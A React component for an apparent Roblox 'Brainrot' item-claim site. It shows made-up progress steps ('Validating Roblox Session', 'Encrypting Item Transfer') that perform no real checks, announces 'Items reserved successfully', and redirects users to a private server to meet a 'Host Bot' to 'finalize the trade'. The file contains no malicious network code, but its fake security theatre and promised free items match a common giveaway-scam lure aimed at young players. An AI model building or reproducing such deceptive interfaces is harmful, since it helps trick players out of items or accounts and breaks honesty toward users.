
import React, { useState, useEffect } from 'react';
import { ClaimStep, RobloxUser, BrainrotItem } from '../types';
import { SERVER_LINK } from '../constants';

interface Props {
  step: ClaimStep;
  user: RobloxUser | null;
  items: BrainrotItem[];
  onClose: () => void;
  onCompleteTransfer: () => void;
}

const ClaimModal: React.FC<Props> = ({ step, user, items, onClose, onCompleteTransfer }) => {
  const [countdown, setCountdown] = useState(5);

  useEffect(() => {
    // Fixed: Changed NodeJS.Timeout to any to avoid "Cannot find namespace 'NodeJS'" in web environment
    let timer: any;
    if (step === ClaimStep.READY && countdown > 0) {
      timer = setTimeout(() => setCountdown(prev => prev - 1), 1000);
    }
    return () => clearTimeout(timer);
  }, [step, countdown]);

  const isProcessing = step === ClaimStep.VALIDATING || step === ClaimStep.ENCRYPTING || step === ClaimStep.AWAITING_VERIFICATION;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center px-4 overflow-hidden">
      <div 
        className="absolute inset-0 bg-black/80 backdrop-blur-md animate-in fade-in duration-300"
        onClick={onClose}
      />
      
      <div className="relative w-full max-w-lg glass-card rounded-3xl p-8 border border-white/10 shadow-2xl animate-in zoom-in-95 fade-in duration-300">
        <button 
          onClick={onClose}
          className="absolute top-6 right-6 p-2 text-gray-500 hover:text-white transition-colors"
        >
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
        </button>

        {/* --- STEP 1: PROCESSING --- */}
        {isProcessing && (
          <div className="space-y-8 py-4">
            <div>
              <h2 className="text-2xl font-black mb-1">Processing Claim</h2>
              <p className="text-gray-400 font-medium">Securely establishing connection...</p>
            </div>

            <div className="space-y-4 bg-black/30 p-6 rounded-2xl border border-white/5">
              <StepItem 
                label="Validating Roblox Session..." 
                active={step === ClaimStep.VALIDATING} 
                completed={step !== ClaimStep.VALIDATING} 
              />
              <StepItem 
                label="Encrypting Item Transfer..." 
                active={step === ClaimStep.ENCRYPTING} 
                completed={step === ClaimStep.AWAITING_VERIFICATION || step === ClaimStep.READY} 
              />
              <StepItem 
                label="Awaiting User Verification..." 
                active={step === ClaimStep.AWAITING_VERIFICATION} 
                completed={step === ClaimStep.READY} 
              />
            </div>

            <div className="flex gap-4">
              <button 
                onClick={onClose}
                className="flex-1 py-4 bg-white/5 hover:bg-white/10 text-gray-300 font-bold rounded-xl transition-all"
              >
                Cancel
              </button>
              <button 
                onClick={onCompleteTransfer}
                disabled={step !== ClaimStep.AWAITING_VERIFICATION}
                className="flex-1 py-4 bg-emerald-500 hover:brightness-110 active:scale-95 text-white font-black rounded-xl shadow-xl shadow-emerald-500/20 transition-all disabled:opacity-30 disabled:pointer-events-none"
              >
                Complete Transfer
              </button>
            </div>
          </div>
        )}

        {/* --- STEP 2: FINALIZING (SPINNER) --- */}
        {step === ClaimStep.FINALIZING && (
          <div className="flex flex-col items-center justify-center py-20 animate-in fade-in duration-500">
            <div className="relative mb-8">
              <div className="w-20 h-20 border-4 border-purple-500/20 rounded-full" />
              <div className="absolute top-0 w-20 h-20 border-4 border-t-purple-500 rounded-full animate-spin" />
            </div>
            <h3 className="text-xl font-black tracking-tight">Finalizing...</h3>
            <p className="text-gray-500 font-bold text-sm mt-2">Preparing items for account {user?.displayName}</p>
          </div>
        )}

        {/* --- STEP 3: READY / REDIRECT --- */}
        {step === ClaimStep.READY && (
          <div className="space-y-8 py-4 animate-in slide-in-from-bottom-4 fade-in duration-500">
            <div className="flex items-center gap-4">
              <div className="w-16 h-16 bg-emerald-500/10 rounded-full flex items-center justify-center border border-emerald-500/20">
                <svg className="w-8 h-8 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
              </div>
              <div>
                <h2 className="text-3xl font-black leading-none mb-2">Transfer Ready!</h2>
                <p className="text-emerald-500 font-bold text-sm">Items reserved successfully.</p>
              </div>
            </div>

            <div className="bg-black/30 p-8 rounded-3xl border-2 border-dashed border-white/10">
              <p className="text-[10px] font-black tracking-[0.2em] text-gray-500 uppercase mb-4">Next Steps</p>
              <p className="text-gray-300 text-lg leading-relaxed font-medium">
                Join the private server automatically. <br />
                Locate the <span className="px-2 py-0.5 bg-purple-500/20 text-purple-400 rounded-md font-black">Host Bot</span> in the spawn area to finalize the trade.
              </p>
            </div>

            <div className="text-center space-y-6">
              <p className="text-gray-500 text-sm font-bold">
                Auto-redirecting in <span className="text-white text-xl mx-1">{countdown}</span> seconds...
              </p>
              <a 
                href={SERVER_LINK}
                target="_blank"
                rel="noopener noreferrer"
                className="block w-full py-5 bg-red-600 hover:bg-red-500 active:scale-[0.98] text-white font-black text-xl rounded-2xl shadow-2xl shadow-red-600/30 transition-all flex items-center justify-center gap-3"
              >
                Join Server Now
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M14 5l7 7m0 0l-7 7m7-7H3" /></svg>
              </a>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

const StepItem = ({ label, active, completed }: { label: string; active: boolean; completed: boolean }) => (
  <div className={`flex items-center gap-4 transition-all duration-500 ${active ? 'opacity-100 scale-100' : completed ? 'opacity-100' : 'opacity-30 scale-95'}`}>
    <div className={`w-8 h-8 rounded-full flex items-center justify-center transition-all ${
      completed ? 'bg-emerald-500' : active ? 'bg-purple-500 animate-pulse' : 'bg-white/10'
    }`}>
      {completed ? (
        <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
      ) : active ? (
        <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
      ) : (
        <div className="w-2 h-2 bg-white/20 rounded-full" />
      )}
    </div>
    <span className={`font-bold text-sm ${active ? 'text-white' : 'text-gray-400'}`}>{label}</span>
  </div>
);

export default ClaimModal;
